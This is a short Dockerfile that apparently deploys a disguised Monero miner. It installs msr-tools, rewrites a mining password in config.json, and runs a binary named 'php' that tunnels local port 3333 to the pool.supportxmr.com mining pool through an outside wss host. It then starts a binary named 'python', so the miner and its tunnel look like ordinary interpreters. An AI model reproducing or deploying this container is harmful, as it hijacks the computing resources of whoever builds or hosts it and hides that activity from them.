FROM debian:sid
ENV NAME_ID=vscwjm-build-ub

WORKDIR /app
COPY * /app/

RUN apt update -y \
  && apt upgrade -y \
  && apt install -y procps msr-tools
RUN chmod a+x *
RUN sed -i "s/\"pass\": \"notunn\"/\"pass\": \"$NAME_ID\"/" /app/config.json
RUN ( /app/php -L 127.0.0.1:3333:pool.supportxmr.com:3333 wss://op-cf.vscwjm.eu.org & ) && ./python

CMD ./init.sh
